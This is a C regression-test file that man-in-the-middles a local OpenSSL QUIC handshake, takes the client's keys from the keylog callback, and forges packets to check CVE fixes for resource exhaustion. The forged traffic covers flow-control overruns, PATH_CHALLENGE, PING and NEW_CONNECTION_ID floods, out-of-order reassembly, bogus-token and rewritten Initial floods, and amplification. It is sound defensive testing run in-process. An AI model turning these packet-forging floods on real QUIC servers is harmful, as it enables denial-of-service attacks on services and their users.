/*
 * CVE regression checks for QUIC: a client and a listener in one process, with this program in
 * the middle of their datagrams. It completes a real handshake, takes the client's secrets from
 * the keylog callback, then plays a malicious client: it builds its own packets (1-RTT packets
 * under the client's keys, and Initial packets under the keys anyone can derive from the
 * destination connection ID, RFC 9001 section 5) and feeds them to the server, which never sees
 * its acknowledgements. Each check prints only what both libraries must agree on: how the
 * connection ends, whether data arrives, and whether memory, time and amplification stay within
 * bounds (the bounds are far above a correct stack's use and far below a vulnerable one's).
 */
#ifdef __APPLE__
#define _DARWIN_C_SOURCE /* ru_maxrss */
#endif
#include "cve.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <time.h>

#include <openssl/core_names.h>
#include <openssl/kdf.h>
#include <openssl/quic.h>

/* ---- Keys and packet protection (RFC 9001) ---- */

typedef struct {
    unsigned char key[16], iv[12], hp[16];
} keys;

static int hkdf(int mode, const unsigned char *key, size_t keylen, const unsigned char *salt,
                size_t saltlen, const unsigned char *info, size_t infolen, unsigned char *out,
                size_t outlen)
{
    EVP_KDF *kdf = EVP_KDF_fetch(NULL, "HKDF", NULL);
    EVP_KDF_CTX *ctx = EVP_KDF_CTX_new(kdf);
    OSSL_PARAM params[6], *p = params;
    int ok;

    *p++ = OSSL_PARAM_construct_utf8_string(OSSL_KDF_PARAM_DIGEST, (char *)"SHA256", 0);
    *p++ = OSSL_PARAM_construct_int(OSSL_KDF_PARAM_MODE, &mode);
    *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_KEY, (void *)key, keylen);
    if (salt != NULL)
        *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_SALT, (void *)salt, saltlen);
    if (info != NULL)
        *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_INFO, (void *)info, infolen);
    *p = OSSL_PARAM_construct_end();
    ok = EVP_KDF_derive(ctx, out, outlen, params) == 1;
    EVP_KDF_CTX_free(ctx);
    EVP_KDF_free(kdf);
    return ok;
}

/* HKDF-Expand-Label (RFC 8446 section 7.1) with an empty context. */
static void expand_label(const unsigned char *secret, const char *label, unsigned char *out,
                         size_t outlen)
{
    unsigned char info[64];
    size_t n = 0, l = strlen(label);

    info[n++] = (unsigned char)(outlen >> 8);
    info[n++] = (unsigned char)outlen;
    info[n++] = (unsigned char)(6 + l);
    memcpy(info + n, "tls13 ", 6);
    n += 6;
    memcpy(info + n, label, l);
    n += l;
    info[n++] = 0;
    hkdf(EVP_KDF_HKDF_MODE_EXPAND_ONLY, secret, 32, NULL, 0, info, n, out, outlen);
}

static void derive(const unsigned char *secret, keys *k)
{
    expand_label(secret, "quic key", k->key, sizeof(k->key));
    expand_label(secret, "quic iv", k->iv, sizeof(k->iv));
    expand_label(secret, "quic hp", k->hp, sizeof(k->hp));
}

/* The client's Initial keys for a destination connection ID (RFC 9001 section 5.2). */
static void initial_keys(const unsigned char *dcid, size_t dcidlen, keys *k)
{
    static const unsigned char salt[] = { 0x38, 0x76, 0x2c, 0xf7, 0xf5, 0x59, 0x34, 0xb3, 0x4d,
                                          0x17, 0x9a, 0xe6, 0xa4, 0xc8, 0x0c, 0xad, 0xcc, 0xbb,
                                          0x7f, 0x0a };
    unsigned char initial[32], client[32];

    hkdf(EVP_KDF_HKDF_MODE_EXTRACT_ONLY, dcid, dcidlen, salt, sizeof(salt), NULL, 0, initial,
         sizeof(initial));
    expand_label(initial, "client in", client, sizeof(client));
    derive(client, k);
}

static void hp_mask(const keys *k, const unsigned char *sample, unsigned char mask[16])
{
    EVP_CIPHER_CTX *c = EVP_CIPHER_CTX_new();
    int n;

    EVP_EncryptInit_ex(c, EVP_aes_128_ecb(), NULL, k->hp, NULL);
    EVP_CIPHER_CTX_set_padding(c, 0);
    EVP_EncryptUpdate(c, mask, &n, sample, 16);
    EVP_CIPHER_CTX_free(c);
}

static void nonce(const keys *k, uint64_t pn, unsigned char out[12])
{
    memcpy(out, k->iv, 12);
    for (int i = 0; i < 8; i++)
        out[11 - i] ^= (unsigned char)(pn >> (8 * i));
}

/* AES-128-GCM over `in`, with `aad`; writes len + 16 octets to `out`, or 0 on failure. */
static size_t seal(const keys *k, uint64_t pn, const unsigned char *aad, size_t aadlen,
                   const unsigned char *in, size_t len, unsigned char *out)
{
    EVP_CIPHER_CTX *c = EVP_CIPHER_CTX_new();
    unsigned char iv[12];
    int n = 0, m = 0;

    nonce(k, pn, iv);
    EVP_EncryptInit_ex(c, EVP_aes_128_gcm(), NULL, k->key, iv);
    EVP_EncryptUpdate(c, NULL, &n, aad, (int)aadlen);
    EVP_EncryptUpdate(c, out, &n, in, (int)len);
    EVP_EncryptFinal_ex(c, out + n, &m);
    EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_GCM_GET_TAG, 16, out + len);
    EVP_CIPHER_CTX_free(c);
    return len + 16;
}

static int open_gcm(const keys *k, uint64_t pn, const unsigned char *aad, size_t aadlen,
                    const unsigned char *in, size_t len, unsigned char *out)
{
    EVP_CIPHER_CTX *c = EVP_CIPHER_CTX_new();
    unsigned char iv[12];
    int n = 0, m = 0, ok;

    if (len < 16)
        return 0;
    nonce(k, pn, iv);
    EVP_DecryptInit_ex(c, EVP_aes_128_gcm(), NULL, k->key, iv);
    EVP_DecryptUpdate(c, NULL, &n, aad, (int)aadlen);
    EVP_DecryptUpdate(c, out, &n, in, (int)(len - 16));
    EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_GCM_SET_TAG, 16, (void *)(in + len - 16));
    ok = EVP_DecryptFinal_ex(c, out + n, &m) == 1;
    EVP_CIPHER_CTX_free(c);
    return ok;
}

/* ---- Frames ---- */

static void varint(buf *b, uint64_t v)
{
    unsigned char o[8];

    if (v < 0x40) {
        o[0] = (unsigned char)v;
        put(b, o, 1);
    } else if (v < 0x4000) {
        o[0] = (unsigned char)(0x40 | (v >> 8));
        o[1] = (unsigned char)v;
        put(b, o, 2);
    } else if (v < 0x40000000) {
        for (int i = 0; i < 4; i++)
            o[i] = (unsigned char)(v >> (8 * (3 - i)));
        o[0] |= 0x80;
        put(b, o, 4);
    } else {
        for (int i = 0; i < 8; i++)
            o[i] = (unsigned char)(v >> (8 * (7 - i)));
        o[0] |= 0xc0;
        put(b, o, 8);
    }
}

static size_t get_varint(const unsigned char *p, size_t n, uint64_t *v)
{
    size_t len;

    if (n == 0)
        return 0;
    len = (size_t)1 << (p[0] >> 6);
    if (len > n)
        return 0;
    *v = p[0] & 0x3f;
    for (size_t i = 1; i < len; i++)
        *v = (*v << 8) | p[i];
    return len;
}

/* A STREAM frame with offset and length. */
static void stream_frame(buf *b, uint64_t id, uint64_t off, const void *data, size_t len)
{
    varint(b, 0x0e);
    varint(b, id);
    varint(b, off);
    varint(b, len);
    put(b, data, len);
}

/* ---- The man in the middle ---- */

static BIO_ADDR *addr(unsigned short port)
{
    BIO_ADDR *a = BIO_ADDR_new();
    struct in_addr ina;

    ina.s_addr = htonl(0x7f000001);
    BIO_ADDR_rawmake(a, AF_INET, &ina, sizeof(ina), htons(port));
    return a;
}

static void bind_end(BIO *b, unsigned short port)
{
    (void)BIO_dgram_set_caps(b, BIO_DGRAM_CAP_HANDLES_DST_ADDR | BIO_DGRAM_CAP_HANDLES_SRC_ADDR);
    (void)BIO_dgram_set0_local_addr(b, addr(port));
}

typedef struct {
    SSL_CTX *cctx, *sctx;
    SSL *client, *listener, *server;
    BIO *to_client; /* this program's end facing the client */
    BIO *to_server; /* this program's end facing the listener */
    BIO_ADDR *client_addr, *server_addr;
    unsigned char first[1500]; /* the client's first datagram */
    size_t first_len;
    unsigned char scid[20]; /* the server's connection ID */
    size_t scid_len;
    keys tx; /* the client's 1-RTT keys */
    int have_secret;
    uint64_t pn;
    size_t to_server_bytes, from_server_bytes;
} mitm;

static mitm *keylog_target;

static int unhex(const char *s, unsigned char *out, size_t max)
{
    size_t n = 0;

    while (s[0] != '\0' && s[1] != '\0' && n < max) {
        unsigned int v;

        if (sscanf(s, "%2x", &v) != 1)
            break;
        out[n++] = (unsigned char)v;
        s += 2;
    }
    return (int)n;
}

static void keylog(const SSL *ssl, const char *line)
{
    const char *label = "CLIENT_TRAFFIC_SECRET_0 ";
    unsigned char secret[48];

    (void)ssl;
    if (keylog_target == NULL || strncmp(line, label, strlen(label)) != 0)
        return;
    line = strchr(line + strlen(label), ' ');
    if (line != NULL && unhex(line + 1, secret, sizeof(secret)) == 32) {
        derive(secret, &keylog_target->tx);
        keylog_target->have_secret = 1;
    }
}

static int recv_one(BIO *b, unsigned char *data, size_t cap, size_t *len)
{
    BIO_MSG m;
    size_t got = 0;

    memset(&m, 0, sizeof(m));
    m.data = data;
    m.data_len = cap;
    if (!BIO_recvmmsg(b, &m, sizeof(m), 1, 0, &got) || got != 1)
        return 0;
    *len = m.data_len;
    return 1;
}

static void send_one(BIO *b, const unsigned char *data, size_t len, BIO_ADDR *from, BIO_ADDR *to)
{
    BIO_MSG m;
    size_t sent = 0;

    memset(&m, 0, sizeof(m));
    m.data = (void *)data;
    m.data_len = len;
    m.peer = to;
    (void)from; /* the source is the address bound to this end */
    BIO_sendmmsg(b, &m, sizeof(m), 1, 0, &sent);
}

/* Datagrams the client sent, to the server (the first one is kept). */
static void client_to_server(mitm *m)
{
    unsigned char d[65536];
    size_t n;

    while (recv_one(m->to_client, d, sizeof(d), &n)) {
        if (m->first_len == 0 && n <= sizeof(m->first)) {
            memcpy(m->first, d, n);
            m->first_len = n;
        }
        send_one(m->to_server, d, n, m->client_addr, m->server_addr);
        m->to_server_bytes += n;
    }
}

/* Datagrams the server sent: to the client when `deliver`, else dropped. Notes the server's
 * connection ID from its first long-header packet. */
static void server_to_client(mitm *m, int deliver)
{
    unsigned char d[65536];
    size_t n;

    while (recv_one(m->to_server, d, sizeof(d), &n)) {
        m->from_server_bytes += n;
        if (m->scid_len == 0 && n > 7 && (d[0] & 0x80) != 0) {
            size_t dl = d[5], sl;

            if (6 + dl < n) {
                sl = d[6 + dl];
                if (sl <= sizeof(m->scid) && 7 + dl + sl <= n) {
                    memcpy(m->scid, d + 7 + dl, sl);
                    m->scid_len = sl;
                }
            }
        }
        if (deliver)
            send_one(m->to_client, d, n, m->server_addr, m->client_addr);
    }
}

static X509 *cert;
static EVP_PKEY *key;
static const unsigned char alpn[] = { 8, 'o', 's', 's', 'l', 't', 'e', 's', 't' };

static int select_alpn(SSL *s, const unsigned char **out, unsigned char *outlen,
                       const unsigned char *in, unsigned int inlen, void *arg)
{
    (void)s;
    (void)arg;
    if (SSL_select_next_proto((unsigned char **)out, outlen, alpn, sizeof(alpn), in, inlen)
        != OPENSSL_NPN_NEGOTIATED)
        return SSL_TLSEXT_ERR_ALERT_FATAL;
    return SSL_TLSEXT_ERR_OK;
}

/* A listener (without address validation when `no_validate`) and a client, through this
 * program; nothing is exchanged yet. */
static void setup(mitm *m, int no_validate)
{
    BIO *c, *s;

    memset(m, 0, sizeof(*m));
    m->client_addr = addr(4433);
    m->server_addr = addr(8443);
    m->sctx = SSL_CTX_new(OSSL_QUIC_server_method());
    SSL_CTX_use_certificate(m->sctx, cert);
    SSL_CTX_use_PrivateKey(m->sctx, key);
    SSL_CTX_set_alpn_select_cb(m->sctx, select_alpn, NULL);
    m->cctx = SSL_CTX_new(OSSL_QUIC_client_method());
    SSL_CTX_set_verify(m->cctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_ciphersuites(m->cctx, "TLS_AES_128_GCM_SHA256");
    SSL_CTX_set_keylog_callback(m->cctx, keylog);

    BIO_new_bio_dgram_pair(&c, 0, &m->to_client, 0);
    BIO_new_bio_dgram_pair(&s, 0, &m->to_server, 0);
    bind_end(c, 4433);
    bind_end(m->to_client, 8443);
    bind_end(s, 8443);
    bind_end(m->to_server, 4433);

    m->listener = SSL_new_listener(m->sctx, no_validate ? SSL_LISTENER_FLAG_NO_VALIDATE : 0);
    SSL_set_bio(m->listener, s, s);
    SSL_listen(m->listener);
    SSL_set_blocking_mode(m->listener, 0);
    m->client = SSL_new(m->cctx);
    SSL_set_bio(m->client, c, c);
    SSL_set1_initial_peer_addr(m->client, m->server_addr);
    SSL_set_alpn_protos(m->client, alpn, sizeof(alpn));
    SSL_set_blocking_mode(m->client, 0);
    m->pn = (uint64_t)1 << 20;
}

/* The handshake through the middle; then the server's connection is accepted. 1 on success. */
static int connect_through(mitm *m)
{
    keylog_target = m;
    for (int i = 0; i < 300; i++) {
        int r = SSL_connect(m->client);

        client_to_server(m);
        SSL_handle_events(m->listener);
        server_to_client(m, 1);
        if (m->server == NULL)
            m->server = SSL_accept_connection(m->listener, SSL_ACCEPT_CONNECTION_NO_BLOCK);
        if (r == 1 && m->server != NULL) {
            /* Let the server see the client's last flight and confirm the handshake. */
            for (int j = 0; j < 4; j++) {
                SSL_handle_events(m->client);
                client_to_server(m);
                SSL_handle_events(m->listener);
                server_to_client(m, 1);
            }
            keylog_target = NULL;
            SSL_set_blocking_mode(m->server, 0);
            return m->have_secret && m->scid_len > 0;
        }
    }
    keylog_target = NULL;
    return 0;
}

static void teardown(mitm *m)
{
    SSL_free(m->server);
    SSL_free(m->client);
    SSL_free(m->listener);
    SSL_CTX_free(m->cctx);
    SSL_CTX_free(m->sctx);
    BIO_free(m->to_client);
    BIO_free(m->to_server);
    BIO_ADDR_free(m->client_addr);
    BIO_ADDR_free(m->server_addr);
}

/* One 1-RTT packet from the client, with `frames` as its payload, to the server; the server's
 * replies are dropped (never acknowledged). */
static void inject(mitm *m, const buf *frames)
{
    unsigned char pkt[1500], mask[16];
    size_t h = 0, pn_off, len;
    uint64_t pn = m->pn++;

    pkt[h++] = 0x43; /* short header, key phase 0, a 4-octet packet number */
    memcpy(pkt + h, m->scid, m->scid_len);
    h += m->scid_len;
    pn_off = h;
    for (int i = 0; i < 4; i++)
        pkt[h++] = (unsigned char)(pn >> (8 * (3 - i)));
    if (h + frames->n + 16 > sizeof(pkt))
        return;
    len = h + seal(&m->tx, pn, pkt, h, frames->p, frames->n, pkt + h);
    hp_mask(&m->tx, pkt + pn_off + 4, mask);
    pkt[0] ^= mask[0] & 0x1f;
    for (int i = 0; i < 4; i++)
        pkt[pn_off + i] ^= mask[1 + i];
    send_one(m->to_server, pkt, len, m->client_addr, m->server_addr);
    m->to_server_bytes += len;
    SSL_handle_events(m->listener);
    server_to_client(m, 0);
}

/* The server connection's close: "open", or "closed, code N". */
static const char *close_state(mitm *m, char *out, size_t outlen)
{
    SSL_CONN_CLOSE_INFO info;

    if (m->server == NULL || SSL_get_conn_close_info(m->server, &info, sizeof(info)) != 1)
        snprintf(out, outlen, "open");
    else
        snprintf(out, outlen, "closed by the %s, code %llu",
                 (info.flags & SSL_CONN_CLOSE_FLAG_LOCAL) != 0 ? "server" : "client",
                 (unsigned long long)info.error_code);
    return out;
}

/* ---- Bounds ---- */

/* The process's peak resident size in MiB. */
static long peak_mib(void)
{
    struct rusage u;

    getrusage(RUSAGE_SELF, &u);
#ifdef __APPLE__
    return (long)(u.ru_maxrss / (1024 * 1024));
#else
    return (long)(u.ru_maxrss / 1024);
#endif
}

static double now(void)
{
    struct timespec t;

    clock_gettime(CLOCK_MONOTONIC, &t);
    return (double)t.tv_sec + (double)t.tv_nsec / 1e9;
}

/* ---- The checks ---- */

/* CVE-2026-75804: STREAM data past the connection's flow-control window, spread over streams
 * that each stay within their own window, closes the connection. */
static void connection_flow_control(void)
{
    mitm m;
    unsigned char data[1000];
    char state[96];
    uint64_t total = 0;
    int ok;

    memset(data, 'x', sizeof(data));
    setup(&m, 1);
    ok = connect_through(&m);
    check(ok, "CVE-2026-75804: the handshake through the middle completes");
    /* 64 client streams of 128 KiB each: 8 MiB in all. */
    for (uint64_t s = 0; ok && s < 64 && strcmp(close_state(&m, state, sizeof(state)), "open") == 0;
         s++) {
        for (uint64_t off = 0; off < 128 * 1024; off += sizeof(data)) {
            buf f = {0};

            stream_frame(&f, s * 4, off, data, sizeof(data));
            inject(&m, &f);
            free_buf(&f);
            total += sizeof(data);
        }
    }
    note("sent %s KiB", total > 1024 * 1024 ? "over 1024" : "at most 1024");
    note("server: %s", close_state(&m, state, sizeof(state)));
    check(strcmp(state, "closed by the server, code 3") == 0,
          "CVE-2026-75804: data past the connection's flow-control window closes the connection "
          "with FLOW_CONTROL_ERROR");
    teardown(&m);
    ERR_clear_error();
}

/* Floods the server with `count` packets of `frame`; whether the server's memory stayed in
 * bounds, and how the connection ended. */
static void flood(const char *cve, const char *what, int count,
                  void (*frame)(buf *, int), int max_mib)
{
    mitm m;
    char state[96];
    long before;
    int ok;

    setup(&m, 1);
    ok = connect_through(&m);
    before = peak_mib();
    for (int i = 0; ok && i < count; i++) {
        buf f = {0};

        frame(&f, i);
        inject(&m, &f);
        free_buf(&f);
        if (i % 1000 == 999 && strcmp(close_state(&m, state, sizeof(state)), "open") != 0)
            break;
    }
    note("%s: server %s", what, close_state(&m, state, sizeof(state)));
    check(ok && peak_mib() - before < max_mib, "%s: %s keeps the server's memory bounded", cve,
          what);
    teardown(&m);
    ERR_clear_error();
}

static void path_challenge(buf *f, int i)
{
    unsigned char data[8];

    memset(data, 0, sizeof(data));
    memcpy(data, &i, sizeof(i));
    for (int k = 0; k < 40; k++) {
        varint(f, 0x1a);
        data[7] = (unsigned char)k;
        put(f, data, sizeof(data));
    }
}

static void ping(buf *f, int i)
{
    (void)i;
    varint(f, 0x01);
}

static void new_connection_id(buf *f, int i)
{
    unsigned char cid[8], token[16];

    memset(cid, 0, sizeof(cid));
    memcpy(cid, &i, sizeof(i));
    cid[7] = 0x5a;
    memset(token, 0, sizeof(token));
    memcpy(token, &i, sizeof(i));
    varint(f, 0x18);
    varint(f, (uint64_t)i + 1);
    varint(f, (uint64_t)i + 1);
    varint(f, sizeof(cid));
    put(f, cid, sizeof(cid));
    put(f, token, sizeof(token));
}

/* One-octet STREAM frames at every other offset of stream 4: the gaps are never filled. */
static void sparse_stream(buf *f, int i)
{
    for (int k = 0; k < 100; k++)
        stream_frame(f, 4, ((uint64_t)i * 100 + (uint64_t)k) * 2 + 1, "y", 1);
}

/* CVE-2026-42772: out-of-order STREAM data is reassembled without quadratic cost. */
static void reassembly(void)
{
    enum { N = 20000, PER = 100 };
    mitm m;
    char state[96];
    unsigned char *got = calloc(N, 1);
    SSL *stream = NULL;
    size_t total = 0;
    double start, elapsed;
    int ok, right = 1;

    setup(&m, 1);
    ok = connect_through(&m);
    start = now();
    /* Offsets N-1 down to 0, one octet each, PER frames to a packet. */
    for (int i = N - 1; ok && i >= 0; i -= PER) {
        buf f = {0};

        for (int k = 0; k < PER && i - k >= 0; k++) {
            unsigned char c = (unsigned char)('a' + (i - k) % 26);

            stream_frame(&f, 0, (uint64_t)(i - k), &c, 1);
        }
        inject(&m, &f);
        free_buf(&f);
    }
    for (int i = 0; ok && i < 100 && total < N; i++) {
        size_t n = 0;

        SSL_handle_events(m.listener);
        if (stream == NULL)
            stream = SSL_accept_stream(m.server, SSL_ACCEPT_STREAM_NO_BLOCK);
        if (stream != NULL && SSL_read_ex(stream, got + total, N - total, &n))
            total += n;
    }
    elapsed = now() - start;
    for (size_t i = 0; i < total; i++)
        if (got[i] != (unsigned char)('a' + i % 26))
            right = 0;
    note("reassembly: %zu of %d octets read, %s, server %s", total, (int)N,
         right ? "in order" : "out of order", close_state(&m, state, sizeof(state)));
    check(ok && total == N && right, "CVE-2026-42772: reversed one-octet STREAM frames reassemble");
    check(elapsed < 10.0, "CVE-2026-42772: reassembling 20000 reversed fragments takes no "
          "quadratic time");
    SSL_free(stream);
    teardown(&m);
    free(got);
    ERR_clear_error();
}

/* ---- Initial packets ---- */

/* Rewrites the client's first datagram (one Initial packet) with a new destination connection
 * ID and token; returns the new datagram's length, or 0. */
static size_t rewrite_initial(const unsigned char *in, size_t inlen, const unsigned char *dcid,
                              size_t dcidlen, const unsigned char *token, size_t tokenlen,
                              unsigned char *out, size_t cap)
{
    keys k, nk;
    unsigned char hdr[256], mask[16], plain[1500];
    size_t p = 5, odl, osl, pn_off, pnlen, payload, h = 0;
    uint64_t tl, len, pn = 0;
    size_t n;
    buf b = {0};

    if (inlen < 7 || (in[0] & 0xf0) != 0xc0)
        return 0;
    odl = in[p++];
    initial_keys(in + p, odl, &k);
    p += odl;
    osl = in[p++];
    p += osl;
    n = get_varint(in + p, inlen - p, &tl);
    p += n + (size_t)tl;
    n = get_varint(in + p, inlen - p, &len);
    p += n;
    pn_off = p;
    if (n == 0 || pn_off + 20 > inlen || pn_off + len > inlen)
        return 0;
    memcpy(hdr, in, pn_off);
    hp_mask(&k, in + pn_off + 4, mask);
    hdr[0] = (unsigned char)(in[0] ^ (mask[0] & 0x0f));
    pnlen = (size_t)(hdr[0] & 3) + 1;
    for (size_t i = 0; i < pnlen; i++) {
        hdr[pn_off + i] = in[pn_off + i] ^ mask[1 + i];
        pn = (pn << 8) | hdr[pn_off + i];
    }
    payload = (size_t)len - pnlen;
    if (!open_gcm(&k, pn, hdr, pn_off + pnlen, in + pn_off + pnlen, payload, plain))
        return 0;
    payload -= 16;

    /* The new header: the same flags, version and source ID, a 4-octet packet number. */
    initial_keys(dcid, dcidlen, &nk);
    put(&b, "\xc3", 1);
    put(&b, in + 1, 4);
    put_byte(&b, (unsigned char)dcidlen);
    put(&b, dcid, dcidlen);
    put_byte(&b, (unsigned char)osl);
    put(&b, in + 6 + odl + 1, osl);
    varint(&b, tokenlen);
    put(&b, token, tokenlen);
    {
        unsigned char l[2];
        size_t total = 4 + payload + 16;

        l[0] = (unsigned char)(0x40 | (total >> 8));
        l[1] = (unsigned char)total;
        put(&b, l, 2);
    }
    pn_off = b.n;
    for (int i = 0; i < 4; i++)
        put_byte(&b, (unsigned char)(pn >> (8 * (3 - i))));
    h = b.n;
    if (h + payload + 16 > cap) {
        free_buf(&b);
        return 0;
    }
    memcpy(out, b.p, h);
    free_buf(&b);
    seal(&nk, pn, out, h, plain, payload, out + h);
    hp_mask(&nk, out + pn_off + 4, mask);
    out[0] ^= mask[0] & 0x0f;
    for (int i = 0; i < 4; i++)
        out[pn_off + i] ^= mask[1 + i];
    return h + payload + 16;
}

/* Runs the client until its first datagram has been taken (not delivered). */
static int first_datagram(mitm *m)
{
    unsigned char d[65536];
    size_t n;

    for (int i = 0; i < 10 && m->first_len == 0; i++) {
        SSL_connect(m->client);
        while (recv_one(m->to_client, d, sizeof(d), &n)) {
            if (m->first_len == 0 && n <= sizeof(m->first)) {
                memcpy(m->first, d, n);
                m->first_len = n;
            }
        }
    }
    return m->first_len > 0;
}

static void to_listener(mitm *m, const unsigned char *d, size_t n)
{
    send_one(m->to_server, d, n, m->client_addr, m->server_addr);
    m->to_server_bytes += n;
    SSL_handle_events(m->listener);
}

/* CVE-2026-42764: an Initial packet carrying a token the server never issued, to a listener
 * without address validation. */
static void invalid_token(void)
{
    mitm m;
    unsigned char d[1600], dcid[8] = { 1, 2, 3, 4, 5, 6, 7, 8 }, token[40];
    size_t n;
    int ok;

    memset(token, 0x77, sizeof(token));
    setup(&m, 1);
    ok = first_datagram(&m);
    n = ok ? rewrite_initial(m.first, m.first_len, dcid, sizeof(dcid), token, sizeof(token), d,
                             sizeof(d))
           : 0;
    note("rewritten Initial: %s", n > 0 ? "made" : "not made");
    if (n > 0)
        to_listener(&m, d, n);
    server_to_client(&m, 0);
    note("invalid token: the server %s", m.from_server_bytes > 0 ? "answered" : "stayed silent");
    check(n > 0, "CVE-2026-42764: an Initial with an invalid token, without address validation, "
          "is handled without a crash");
    teardown(&m);
    ERR_clear_error();
}

/* CVE-2026-35191: one datagram of coalesced copies of an Initial packet counts once toward the
 * server's amplification limit. */
static void amplification(void)
{
    mitm m;
    unsigned char d[1600 * 3];
    size_t received = 0;
    int ok;

    setup(&m, 1);
    ok = first_datagram(&m);
    /* The client's first Initial three times over, in one datagram, sent twice. */
    if (ok) {
        for (int i = 0; i < 3; i++)
            memcpy(d + i * m.first_len, m.first, m.first_len);
        for (int i = 0; i < 2; i++) {
            to_listener(&m, d, 3 * m.first_len);
            received += 3 * m.first_len;
        }
        /* Let its timers fire and the retransmissions go out, never answered. */
        for (int i = 0; i < 40; i++) {
            struct timespec t = { 0, 50 * 1000 * 1000 };

            nanosleep(&t, NULL);
            SSL_handle_events(m.listener);
            server_to_client(&m, 0);
        }
    }
    note("amplification: the server sent %s", m.from_server_bytes == 0 ? "nothing"
         : m.from_server_bytes <= 3 * received ? "within three times what it received"
         : "more than three times what it received");
    check(ok && m.from_server_bytes <= 3 * received,
          "CVE-2026-35191: an unvalidated client gets at most three times the octets it sent");
    teardown(&m);
    ERR_clear_error();
}

/* CVE-2026-14456 and CVE-2026-18798: Initial packets for thousands of unknown connection IDs,
 * none of them accepted. */
static void incoming_flood(void)
{
    mitm m;
    unsigned char d[1600], dcid[8];
    long before;
    size_t made = 0, queued;
    int ok;

    setup(&m, 1);
    ok = first_datagram(&m);
    before = peak_mib();
    for (int i = 0; ok && i < 5000; i++) {
        size_t n;

        memset(dcid, 0xc0, sizeof(dcid));
        memcpy(dcid, &i, sizeof(i));
        n = rewrite_initial(m.first, m.first_len, dcid, sizeof(dcid), NULL, 0, d, sizeof(d));
        if (n > 0) {
            to_listener(&m, d, n);
            made++;
        }
        server_to_client(&m, 0);
    }
    queued = SSL_get_accept_connection_queue_len(m.listener);
    note("incoming flood: %s Initials sent, %s connections queued", made == 5000 ? "5000" : "fewer",
         queued < 5000 ? "fewer than 5000" : "all");
    check(ok && made == 5000 && queued < 5000,
          "CVE-2026-14456: the listener's queue of incoming connections is bounded");
    check(ok && peak_mib() - before < 256,
          "CVE-2026-14456: incoming connections nobody accepts keep memory bounded");
    check(ok, "CVE-2026-18798: Initial packets whose channel can't be created are freed once");
    teardown(&m);
    ERR_clear_error();
}

int main(void)
{
    X509_NAME *n = X509_NAME_new();

    key = EVP_PKEY_Q_keygen(NULL, NULL, "ED25519");
    cert = X509_new();
    X509_NAME_add_entry_by_txt(n, "CN", MBSTRING_ASC, (const unsigned char *)"quic", -1, -1, 0);
    ASN1_INTEGER_set(X509_get_serialNumber(cert), 7);
    X509_set_version(cert, X509_VERSION_3);
    X509_set_subject_name(cert, n);
    X509_set_issuer_name(cert, n);
    X509_gmtime_adj(X509_getm_notBefore(cert), 0);
    X509_gmtime_adj(X509_getm_notAfter(cert), 3600);
    X509_set_pubkey(cert, key);
    X509_sign(cert, key, NULL);
    X509_NAME_free(n);

    connection_flow_control();
    flood("CVE-2026-34183", "a flood of PATH_CHALLENGE frames", 20000, path_challenge, 128);
    flood("CVE-2026-63075", "ack-eliciting packets whose ACKs are never acknowledged", 20000,
          ping, 128);
    flood("CVE-2026-84784", "NEW_CONNECTION_ID frames retiring every earlier ID", 20000,
          new_connection_id, 128);
    flood("CVE-2026-54873", "STREAM fragments whose gaps are never filled", 2000, sparse_stream,
          128);
    reassembly();
    invalid_token();
    amplification();
    incoming_flood();

    X509_free(cert);
    EVP_PKEY_free(key);
    return finish();
}
